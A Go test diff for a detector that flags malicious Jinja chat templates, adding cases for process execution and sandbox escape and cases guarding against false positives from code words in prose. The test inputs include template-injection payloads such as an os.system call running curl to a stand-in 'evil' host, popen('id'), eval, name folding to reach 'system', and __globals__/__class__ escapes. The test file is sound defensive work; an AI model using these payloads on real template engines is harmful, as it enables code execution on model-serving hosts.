@@ -29,8 +29,42 @@ func TestStructuralEscapeFails(t *testing.T) {
 }
 
 func TestProcessExecutionFails(t *testing.T) {
-	if got := Inspect("{{ os.system('curl http://evil') }}").Status; got != checks.Fail {
-		t.Fatalf("status = %s, want FAIL", got)
+	cases := map[string]string{
+		"{{ os.system('curl http://evil') }}":              "a module call",
+		"{{ x.popen('id').read() }}":                       "a process function on any object",
+		"{{ eval('1+1') }}":                                "a code-executing builtin",
+		"{{ cycler|attr('sys' ~ 'tem') }}":                 "a process function reached by a folded name",
+		"{% set m = subprocess %}{{ m }}":                  "a module bound to a variable",
+		"{% if messages %}{{ os.getenv('X') }}{% endif %}": "a module referenced in a branch",
+	}
+	for tpl, why := range cases {
+		r := Inspect(tpl)
+		if r.Status != checks.Fail {
+			t.Errorf("%q (%s) = %s, want FAIL", tpl, why, r.Status)
+			continue
+		}
+		if len(r.Findings) == 0 || r.Findings[0].Pattern != "process-execution" {
+			t.Errorf("%q (%s): want a process-execution finding, got %+v", tpl, why, r.Findings)
+		}
+	}
+}
+
+// TestCodeWordsInTextAreNotCode: process-execution names in text the template
+// outputs are prose a model reads, not code the template runs. They used to
+// FAIL from a regex over the raw template (#130). Falsification: match the
+// names over the raw template text again and these FAIL.
+func TestCodeWordsInTextAreNotCode(t *testing.T) {
+	cases := map[string]string{
+		"{{ bos_token }}You are a coding assistant. Prefer the subprocess module over os.system(), and never use eval( or exec( on user input.{% for m in messages %}{{ m['content'] }}{% endfor %}": "coding advice in a default system prompt",
+		"Explain what __class__ and __globals__ mean in Python.":                                         "dunder names in prose",
+		"{% for m in messages %}{% if m['role'] == 'system' %}{{ m['content'] }}{% endif %}{% endfor %}": "the role name system as a key",
+		"{% for m in messages|selectattr('role', 'equalto', 'system') %}{{ m['content'] }}{% endfor %}":  "system as a filter argument",
+		"{# os.system('id') is not allowed here #}{{ messages[0]['content'] }}":                          "code words in a Jinja comment",
+	}
+	for tpl, why := range cases {
+		if got := Inspect(tpl); got.Status == checks.Fail {
+			t.Errorf("%s: FAIL from words, not code: %+v", why, got.Findings)
+		}
 	}
 }
 
@@ -110,5 +144,20 @@ func TestDetectorSeparatesCleanFromStructural(t *testing.T) {
 	}
 	if got := Inspect("{{ ''.__globals__ }}").Status; got != checks.Fail {
 		t.Fatalf("structural escape = %s, want FAIL", got)
+	}
+}
+
+// TestFilterBlockIsAnalysed: a filter block now parses, so its body and its
+// filter are analysed like any other code. Before #137 such a template was an
+// unreadable LEAD; now code inside it is a FAIL with evidence.
+func TestFilterBlockIsAnalysed(t *testing.T) {
+	for tpl, want := range map[string]checks.Status{
+		"{% filter trim %}{{ ''.__class__ }}{% endfilter %}":           checks.Fail,
+		"{% filter attr('__globals__') %}x{% endfilter %}":             checks.Fail,
+		"{% filter trim %}You are a helpful assistant.{% endfilter %}": checks.Pass,
+	} {
+		if got := Inspect(tpl).Status; got != want {
+			t.Errorf("%q = %s, want %s", tpl, got, want)
+		}
 	}
 }
